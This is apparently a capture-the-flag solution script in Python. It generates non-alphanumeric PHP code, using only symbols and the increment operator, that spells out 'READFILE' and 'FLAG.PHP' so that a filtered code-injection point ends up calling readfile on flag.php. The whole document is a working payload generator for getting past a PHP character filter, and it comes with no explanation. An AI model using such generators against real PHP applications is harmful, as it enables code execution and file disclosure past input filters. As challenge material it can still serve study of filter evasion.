def encodeString(payload, variableName): # Payload is the string to be encoded, the variableName is generally '___' (a certain number of underscores)
	payload = payload.upper()

	ans = '$' + variableName + '="";' # Initializes the variable

	for c in payload:
		if c in '$()_[]=;+.': # If it is an allowed character, concatenates it directly
			ans += '$' + variableName + '.="' + c + '";'

		else: # Otherwise it creates the letter starting from the 'A'
			offset = ord(c) - ord('A')
			ans += '$__=$_;'
			ans += '$__++;' * offset
			ans += '$' + variableName + '.=$__;'

	return ans

READFILE = encodeString('READFILE', '___')
FLAG = encodeString('FLAG.PHP', '____')
print('Readfile: {}'.format(READFILE))
print('Flag.php: {}'.format(FLAG))

# $___($____)